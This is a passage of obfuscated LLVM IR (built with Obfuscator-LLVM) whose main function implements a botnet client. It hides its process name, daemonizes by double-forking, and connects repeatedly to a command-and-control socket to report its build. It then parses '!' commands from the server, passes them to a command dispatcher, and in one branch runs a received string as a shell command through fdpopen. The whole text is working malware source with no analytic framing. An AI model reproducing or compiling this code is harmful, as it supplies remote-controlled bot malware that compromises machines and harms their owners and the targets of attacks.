  %96 = sub i32 0, 1
  %97 = sub i32 %95, %96
  %98 = add nsw i32 %95, 1
  store i32 %97, i32* %10, align 4
  br label %79

; <label>:99:                                     ; preds = %79
  br label %100

; <label>:100:                                    ; preds = %99, %65
  %101 = load i32, i32* %2, align 4
  %102 = call i32 @close(i32 %101)
  br label %103

; <label>:103:                                    ; preds = %100, %36, %29, %15
  %104 = load i32, i32* %1, align 4
  ret i32 %104
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) #4

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) #4

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.61, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [1024 x i8], align 16
  %20 = alloca i32, align 4
  %21 = alloca [10 x i8*], align 16
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str, i32 0, i32 0), i8** %6, align 8
  %25 = call i8* @getBuild()
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.62, i32 0, i32 0), i8* %25)
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 0
  %29 = load i8*, i8** %28, align 8
  %30 = load i8**, i8*** %5, align 8
  %31 = getelementptr inbounds i8*, i8** %30, i64 0
  %32 = load i8*, i8** %31, align 8
  %33 = call i64 @strlen(i8* %32) #10
  %34 = call i8* @strncpy(i8* %29, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str, i32 0, i32 0), i64 %33) #2
  %35 = load i8**, i8*** %5, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str, i32 0, i32 0), i8** %36, align 8
  %37 = load i8*, i8** %6, align 8
  %38 = ptrtoint i8* %37 to i64
  %39 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %38, i32 0, i32 0, i32 0)
  %40 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %41 = call i32 @getpid() #2
  %42 = xor i32 %40, -1
  %43 = and i32 %41, %42
  %44 = xor i32 %41, -1
  %45 = and i32 %40, %44
  %46 = or i32 %43, %45
  %47 = xor i32 %40, %41
  call void @srand(i32 %46) #2
  %48 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %49 = call i32 @getpid() #2
  %50 = xor i32 %48, -1
  %51 = and i32 %49, %50
  %52 = xor i32 %49, -1
  %53 = and i32 %48, %52
  %54 = or i32 %51, %53
  %55 = xor i32 %48, %49
  call void @init_rand(i32 %54)
  %56 = call i32 @getOurIP()
  %57 = call i32 @fork() #2
  store i32 %57, i32* %7, align 4
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %59, label %62

; <label>:59:                                     ; preds = %2
  %60 = load i32, i32* %7, align 4
  %61 = call i32 @waitpid(i32 %60, i32* %9, i32 0)
  call void @exit(i32 0) #14
  unreachable

; <label>:62:                                     ; preds = %2
  %63 = load i32, i32* %7, align 4
  %64 = icmp ne i32 %63, 0
  br i1 %64, label %76, label %65

; <label>:65:                                     ; preds = %62
  %66 = call i32 @fork() #2
  store i32 %66, i32* %8, align 4
  %67 = icmp ne i32 %66, 0
  br i1 %67, label %68, label %69

; <label>:68:                                     ; preds = %65
  call void @exit(i32 0) #14
  unreachable

; <label>:69:                                     ; preds = %65
  %70 = load i32, i32* %8, align 4
  %71 = icmp ne i32 %70, 0
  br i1 %71, label %73, label %72

; <label>:72:                                     ; preds = %69
  br label %74

; <label>:73:                                     ; preds = %69
  br label %74

; <label>:74:                                     ; preds = %73, %72
  br label %75

; <label>:75:                                     ; preds = %74
  br label %77

; <label>:76:                                     ; preds = %62
  br label %77

; <label>:77:                                     ; preds = %76, %75
  br label %78

; <label>:78:                                     ; preds = %77
  %79 = call i32 @setsid() #2
  %80 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.63, i32 0, i32 0)) #2
  %81 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #2
  br label %82

; <label>:82:                                     ; preds = %421, %85, %78
  %83 = call i32 @initConnection()
  %84 = icmp ne i32 %83, 0
  br i1 %84, label %85, label %87

; <label>:85:                                     ; preds = %82
  %86 = call i32 @sleep(i32 5)
  br label %82

; <label>:87:                                     ; preds = %82
  %88 = load i32, i32* @mainCommSock, align 4
  %89 = call i8* @getBuild()
  %90 = call i32 (i32, i8*, ...) @sockprintf(i32 %88, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.64, i32 0, i32 0), i8* %89)
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  br label %91

; <label>:91:                                     ; preds = %420, %330, %244, %206, %87
  %92 = load i32, i32* @mainCommSock, align 4
  %93 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %94 = call i32 @recvLine(i32 %92, i8* %93, i32 4096)
  store i32 %94, i32* %11, align 4
  %95 = icmp ne i32 %94, -1
  br i1 %95, label %96, label %421

; <label>:96:                                     ; preds = %91
  store i32 0, i32* %12, align 4
  br label %97

; <label>:97:                                     ; preds = %191, %96
  %98 = load i32, i32* %12, align 4
  %99 = sext i32 %98 to i64
  %100 = load i64, i64* @numpids, align 8
  %101 = icmp ult i64 %99, %100
  br i1 %101, label %102, label %197

; <label>:102:                                    ; preds = %97
  %103 = load i32*, i32** @pids, align 8
  %104 = load i32, i32* %12, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i32, i32* %103, i64 %105
  %107 = load i32, i32* %106, align 4
  %108 = call i32 @waitpid(i32 %107, i32* null, i32 1)
  %109 = icmp sgt i32 %108, 0
  br i1 %109, label %110, label %190

; <label>:110:                                    ; preds = %102
  %111 = load i32, i32* %12, align 4
  %112 = sub i32 0, %111
  %113 = sub i32 0, 1
  %114 = add i32 %112, %113
  %115 = sub i32 0, %114
  %116 = add nsw i32 %111, 1
  store i32 %115, i32* %14, align 4
  br label %117

; <label>:117:                                    ; preds = %136, %110
  %118 = load i32, i32* %14, align 4
  %119 = zext i32 %118 to i64
  %120 = load i64, i64* @numpids, align 8
  %121 = icmp ult i64 %119, %120
  br i1 %121, label %122, label %142

; <label>:122:                                    ; preds = %117
  %123 = load i32*, i32** @pids, align 8
  %124 = load i32, i32* %14, align 4
  %125 = zext i32 %124 to i64
  %126 = getelementptr inbounds i32, i32* %123, i64 %125
  %127 = load i32, i32* %126, align 4
  %128 = load i32*, i32** @pids, align 8
  %129 = load i32, i32* %14, align 4
  %130 = add i32 %129, -520522390
  %131 = sub i32 %130, 1
  %132 = sub i32 %131, -520522390
  %133 = sub i32 %129, 1
  %134 = zext i32 %132 to i64
  %135 = getelementptr inbounds i32, i32* %128, i64 %134
  store i32 %127, i32* %135, align 4
  br label %136

; <label>:136:                                    ; preds = %122
  %137 = load i32, i32* %14, align 4
  %138 = add i32 %137, 244123580
  %139 = add i32 %138, 1
  %140 = sub i32 %139, 244123580
  %141 = add i32 %137, 1
  store i32 %140, i32* %14, align 4
  br label %117

; <label>:142:                                    ; preds = %117
  %143 = load i32*, i32** @pids, align 8
  %144 = load i32, i32* %14, align 4
  %145 = add i32 %144, -261195543
  %146 = sub i32 %145, 1
  %147 = sub i32 %146, -261195543
  %148 = sub i32 %144, 1
  %149 = zext i32 %147 to i64
  %150 = getelementptr inbounds i32, i32* %143, i64 %149
  store i32 0, i32* %150, align 4
  %151 = load i64, i64* @numpids, align 8
  %152 = sub i64 0, %151
  %153 = sub i64 0, -1
  %154 = add i64 %152, %153
  %155 = sub i64 0, %154
  %156 = add i64 %151, -1
  store i64 %155, i64* @numpids, align 8
  %157 = load i64, i64* @numpids, align 8
  %158 = add i64 %157, 4922585583939585805
  %159 = add i64 %158, 1
  %160 = sub i64 %159, 4922585583939585805
  %161 = add i64 %157, 1
  %162 = mul i64 %160, 4
  %163 = call noalias i8* @malloc(i64 %162) #2
  %164 = bitcast i8* %163 to i32*
  store i32* %164, i32** %13, align 8
  store i32 0, i32* %14, align 4
  br label %165

; <label>:165:                                    ; preds = %180, %142
  %166 = load i32, i32* %14, align 4
  %167 = zext i32 %166 to i64
  %168 = load i64, i64* @numpids, align 8
  %169 = icmp ult i64 %167, %168
  br i1 %169, label %170, label %186

; <label>:170:                                    ; preds = %165
  %171 = load i32*, i32** @pids, align 8
  %172 = load i32, i32* %14, align 4
  %173 = zext i32 %172 to i64
  %174 = getelementptr inbounds i32, i32* %171, i64 %173
  %175 = load i32, i32* %174, align 4
  %176 = load i32*, i32** %13, align 8
  %177 = load i32, i32* %14, align 4
  %178 = zext i32 %177 to i64
  %179 = getelementptr inbounds i32, i32* %176, i64 %178
  store i32 %175, i32* %179, align 4
  br label %180

; <label>:180:                                    ; preds = %170
  %181 = load i32, i32* %14, align 4
  %182 = sub i32 %181, -520608076
  %183 = add i32 %182, 1
  %184 = add i32 %183, -520608076
  %185 = add i32 %181, 1
  store i32 %184, i32* %14, align 4
  br label %165

; <label>:186:                                    ; preds = %165
  %187 = load i32*, i32** @pids, align 8
  %188 = bitcast i32* %187 to i8*
  call void @free(i8* %188) #2
  %189 = load i32*, i32** %13, align 8
  store i32* %189, i32** @pids, align 8
  br label %190

; <label>:190:                                    ; preds = %186, %102
  br label %191

; <label>:191:                                    ; preds = %190
  %192 = load i32, i32* %12, align 4
  %193 = sub i32 %192, -1902602803
  %194 = add i32 %193, 1
  %195 = add i32 %194, -1902602803
  %196 = add nsw i32 %192, 1
  store i32 %195, i32* %12, align 4
  br label %97

; <label>:197:                                    ; preds = %97
  %198 = load i32, i32* %11, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %199
  store i8 0, i8* %200, align 1
  %201 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %201)
  %202 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %203 = call i8* @strstr(i8* %202, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.23, i32 0, i32 0)) #10
  %204 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %205 = icmp eq i8* %203, %204
  br i1 %205, label %206, label %209

; <label>:206:                                    ; preds = %197
  %207 = load i32, i32* @mainCommSock, align 4
  %208 = call i32 (i32, i8*, ...) @sockprintf(i32 %207, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0))
  br label %91

; <label>:209:                                    ; preds = %197
  %210 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %211 = call i8* @strstr(i8* %210, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.66, i32 0, i32 0)) #10
  %212 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %213 = icmp eq i8* %211, %212
  br i1 %213, label %214, label %215

; <label>:214:                                    ; preds = %209
  call void @exit(i32 0) #14
  unreachable

; <label>:215:                                    ; preds = %209
  %216 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %216, i8** %15, align 8
  %217 = load i8*, i8** %15, align 8
  %218 = load i8, i8* %217, align 1
  %219 = zext i8 %218 to i32
  %220 = icmp eq i32 %219, 33
  br i1 %220, label %221, label %420

; <label>:221:                                    ; preds = %215
  %222 = load i8*, i8** %15, align 8
  %223 = getelementptr inbounds i8, i8* %222, i64 1
  store i8* %223, i8** %16, align 8
  br label %224

; <label>:224:                                    ; preds = %236, %221
  %225 = load i8*, i8** %16, align 8
  %226 = load i8, i8* %225, align 1
  %227 = zext i8 %226 to i32
  %228 = icmp ne i32 %227, 32
  br i1 %228, label %229, label %234

; <label>:229:                                    ; preds = %224
  %230 = load i8*, i8** %16, align 8
  %231 = load i8, i8* %230, align 1
  %232 = zext i8 %231 to i32
  %233 = icmp ne i32 %232, 0
  br label %234

; <label>:234:                                    ; preds = %229, %224
  %235 = phi i1 [ false, %224 ], [ %233, %229 ]
  br i1 %235, label %236, label %239

; <label>:236:                                    ; preds = %234
  %237 = load i8*, i8** %16, align 8
  %238 = getelementptr inbounds i8, i8* %237, i32 1
  store i8* %238, i8** %16, align 8
  br label %224

; <label>:239:                                    ; preds = %234
  %240 = load i8*, i8** %16, align 8
  %241 = load i8, i8* %240, align 1
  %242 = zext i8 %241 to i32
  %243 = icmp eq i32 %242, 0
  br i1 %243, label %244, label %245

; <label>:244:                                    ; preds = %239
  br label %91

; <label>:245:                                    ; preds = %239
  %246 = load i8*, i8** %16, align 8
  store i8 0, i8* %246, align 1
  %247 = load i8*, i8** %15, align 8
  %248 = getelementptr inbounds i8, i8* %247, i64 1
  store i8* %248, i8** %16, align 8
  %249 = load i8*, i8** %15, align 8
  %250 = load i8*, i8** %16, align 8
  %251 = call i64 @strlen(i8* %250) #10
  %252 = getelementptr inbounds i8, i8* %249, i64 %251
  %253 = getelementptr inbounds i8, i8* %252, i64 2
  store i8* %253, i8** %15, align 8
  br label %254

; <label>:254:                                    ; preds = %279, %245
  %255 = load i8*, i8** %15, align 8
  %256 = load i8*, i8** %15, align 8
  %257 = call i64 @strlen(i8* %256) #10
  %258 = sub i64 %257, -573357569991326002
  %259 = sub i64 %258, 1
  %260 = add i64 %259, -573357569991326002
  %261 = sub i64 %257, 1
  %262 = getelementptr inbounds i8, i8* %255, i64 %260
  %263 = load i8, i8* %262, align 1
  %264 = zext i8 %263 to i32
  %265 = icmp eq i32 %264, 10
  br i1 %265, label %277, label %266

; <label>:266:                                    ; preds = %254
  %267 = load i8*, i8** %15, align 8
  %268 = load i8*, i8** %15, align 8
  %269 = call i64 @strlen(i8* %268) #10
  %270 = sub i64 0, 1
  %271 = add i64 %269, %270
  %272 = sub i64 %269, 1
  %273 = getelementptr inbounds i8, i8* %267, i64 %271
  %274 = load i8, i8* %273, align 1
  %275 = zext i8 %274 to i32
  %276 = icmp eq i32 %275, 13
  br label %277

; <label>:277:                                    ; preds = %266, %254
  %278 = phi i1 [ true, %254 ], [ %276, %266 ]
  br i1 %278, label %279, label %288

; <label>:279:                                    ; preds = %277
  %280 = load i8*, i8** %15, align 8
  %281 = load i8*, i8** %15, align 8
  %282 = call i64 @strlen(i8* %281) #10
  %283 = sub i64 %282, 3068951475578651598
  %284 = sub i64 %283, 1
  %285 = add i64 %284, 3068951475578651598
  %286 = sub i64 %282, 1
  %287 = getelementptr inbounds i8, i8* %280, i64 %285
  store i8 0, i8* %287, align 1
  br label %254

; <label>:288:                                    ; preds = %277
  %289 = load i8*, i8** %15, align 8
  store i8* %289, i8** %17, align 8
  br label %290

; <label>:290:                                    ; preds = %302, %288
  %291 = load i8*, i8** %15, align 8
  %292 = load i8, i8* %291, align 1
  %293 = zext i8 %292 to i32
  %294 = icmp ne i32 %293, 32
  br i1 %294, label %295, label %300

; <label>:295:                                    ; preds = %290
  %296 = load i8*, i8** %15, align 8
  %297 = load i8, i8* %296, align 1
  %298 = zext i8 %297 to i32
  %299 = icmp ne i32 %298, 0
  br label %300

; <label>:300:                                    ; preds = %295, %290
  %301 = phi i1 [ false, %290 ], [ %299, %295 ]
  br i1 %301, label %302, label %305

; <label>:302:                                    ; preds = %300
  %303 = load i8*, i8** %15, align 8
  %304 = getelementptr inbounds i8, i8* %303, i32 1
  store i8* %304, i8** %15, align 8
  br label %290

; <label>:305:                                    ; preds = %300
  %306 = load i8*, i8** %15, align 8
  store i8 0, i8* %306, align 1
  %307 = load i8*, i8** %15, align 8
  %308 = getelementptr inbounds i8, i8* %307, i32 1
  store i8* %308, i8** %15, align 8
  %309 = load i8*, i8** %17, align 8
  store i8* %309, i8** %18, align 8
  br label %310

; <label>:310:                                    ; preds = %314, %305
  %311 = load i8*, i8** %18, align 8
  %312 = load i8, i8* %311, align 1
  %313 = icmp ne i8 %312, 0
  br i1 %313, label %314, label %323

; <label>:314:                                    ; preds = %310
  %315 = load i8*, i8** %18, align 8
  %316 = load i8, i8* %315, align 1
  %317 = zext i8 %316 to i32
  %318 = call i32 @toupper(i32 %317) #10
  %319 = trunc i32 %318 to i8
  %320 = load i8*, i8** %18, align 8
  store i8 %319, i8* %320, align 1
  %321 = load i8*, i8** %18, align 8
  %322 = getelementptr inbounds i8, i8* %321, i32 1
  store i8* %322, i8** %18, align 8
  br label %310

; <label>:323:                                    ; preds = %310
  %324 = load i8*, i8** %17, align 8
  %325 = call i32 @strcmp(i8* %324, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.67, i32 0, i32 0)) #10
  %326 = icmp eq i32 %325, 0
  br i1 %326, label %327, label %350

; <label>:327:                                    ; preds = %323
  %328 = call i32 @listFork()
  %329 = icmp ne i32 %328, 0
  br i1 %329, label %330, label %331

; <label>:330:                                    ; preds = %327
  br label %91

; <label>:331:                                    ; preds = %327
  %332 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %332, i8 0, i64 1024, i32 16, i1 false)
  %333 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %334 = load i8*, i8** %15, align 8
  %335 = call i32 (i8*, i8*, ...) @szprintf(i8* %333, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.68, i32 0, i32 0), i8* %334)
  %336 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %337 = call i32 @fdpopen(i8* %336, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.69, i32 0, i32 0))
  store i32 %337, i32* %20, align 4
  br label %338

; <label>:338:                                    ; preds = %343, %331
  %339 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %340 = load i32, i32* %20, align 4
  %341 = call i8* @fdgets(i8* %339, i32 1024, i32 %340)
  %342 = icmp ne i8* %341, null
  br i1 %342, label %343, label %347

; <label>:343:                                    ; preds = %338
  %344 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @trim(i8* %344)
  %345 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %345, i8 0, i64 1024, i32 16, i1 false)
  %346 = call i32 @sleep(i32 1)
  br label %338

; <label>:347:                                    ; preds = %338
  %348 = load i32, i32* %20, align 4
  %349 = call i32 @fdpclose(i32 %348)
  call void @exit(i32 0) #14
  unreachable

; <label>:350:                                    ; preds = %323
  store i32 1, i32* %22, align 4
  %351 = load i8*, i8** %15, align 8
  %352 = call i8* @strtok(i8* %351, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0)) #2
  store i8* %352, i8** %23, align 8
  %353 = load i8*, i8** %17, align 8
  %354 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 0
  store i8* %353, i8** %354, align 16
  br label %355

; <label>:355:                                    ; preds = %396, %350
  %356 = load i8*, i8** %23, align 8
  %357 = icmp ne i8* %356, null
  br i1 %357, label %358, label %398

; <label>:358:                                    ; preds = %355
  %359 = load i8*, i8** %23, align 8
  %360 = load i8, i8* %359, align 1
  %361 = zext i8 %360 to i32
  %362 = icmp ne i32 %361, 10
  br i1 %362, label %363, label %396

; <label>:363:                                    ; preds = %358
  %364 = load i8*, i8** %23, align 8
  %365 = call i64 @strlen(i8* %364) #10
  %366 = sub i64 0, %365
  %367 = sub i64 0, 1
  %368 = add i64 %366, %367
  %369 = sub i64 0, %368
  %370 = add i64 %365, 1
  %371 = call noalias i8* @malloc(i64 %369) #2
  %372 = load i32, i32* %22, align 4
  %373 = sext i32 %372 to i64
  %374 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %373
  store i8* %371, i8** %374, align 8
  %375 = load i32, i32* %22, align 4
  %376 = sext i32 %375 to i64
  %377 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %376
  %378 = load i8*, i8** %377, align 8
  %379 = load i8*, i8** %23, align 8
  %380 = call i64 @strlen(i8* %379) #10
  %381 = sub i64 %380, -4926551777562872026
  %382 = add i64 %381, 1
  %383 = add i64 %382, -4926551777562872026
  %384 = add i64 %380, 1
  call void @llvm.memset.p0i8.i64(i8* %378, i8 0, i64 %383, i32 1, i1 false)
  %385 = load i32, i32* %22, align 4
  %386 = sext i32 %385 to i64
  %387 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %386
  %388 = load i8*, i8** %387, align 8
  %389 = load i8*, i8** %23, align 8
  %390 = call i8* @strcpy(i8* %388, i8* %389) #2
  %391 = load i32, i32* %22, align 4
  %392 = sub i32 %391, 662124688
  %393 = add i32 %392, 1
  %394 = add i32 %393, 662124688
  %395 = add nsw i32 %391, 1
  store i32 %394, i32* %22, align 4
  br label %396

; <label>:396:                                    ; preds = %363, %358
  %397 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0)) #2
  store i8* %397, i8** %23, align 8
  br label %355

; <label>:398:                                    ; preds = %355
  %399 = load i32, i32* %22, align 4
  %400 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i32 0, i32 0
  call void @processCmd(i32 %399, i8** %400)
  %401 = load i32, i32* %22, align 4
  %402 = icmp sgt i32 %401, 1
  br i1 %402, label %403, label %419

; <label>:403:                                    ; preds = %398
  store i32 1, i32* %24, align 4
  store i32 1, i32* %24, align 4
  br label %404

; <label>:404:                                    ; preds = %413, %403
  %405 = load i32, i32* %24, align 4
  %406 = load i32, i32* %22, align 4
  %407 = icmp slt i32 %405, %406
  br i1 %407, label %408, label %418

; <label>:408:                                    ; preds = %404
  %409 = load i32, i32* %24, align 4
  %410 = sext i32 %409 to i64
  %411 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %410
  %412 = load i8*, i8** %411, align 8
  call void @free(i8* %412) #2
  br label %413

; <label>:413:                                    ; preds = %408
  %414 = load i32, i32* %24, align 4
  %415 = sub i32 0, 1
  %416 = sub i32 %414, %415
  %417 = add nsw i32 %414, 1
  store i32 %416, i32* %24, align 4
  br label %404

; <label>:418:                                    ; preds = %404
  br label %419

; <label>:419:                                    ; preds = %418, %398
  br label %420

; <label>:420:                                    ; preds = %419, %215
  br label %91

; <label>:421:                                    ; preds = %91
  br label %82
                                                  ; No predecessors!
  %423 = load i32, i32* %3, align 4
  ret i32 %423
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #4

declare i32 @prctl(...) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

declare i32 @sleep(i32) #3

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146615408}
!2 = !{i32 -2146614717}
!3 = !{i32 -2146613968}
!4 = !{i32 -2146613145}
!5 = !{i32 -2146612325}
!6 = !{i32 -2146611007}
!7 = !{i32 -2146610145}
!8 = !{i32 -2146609424}
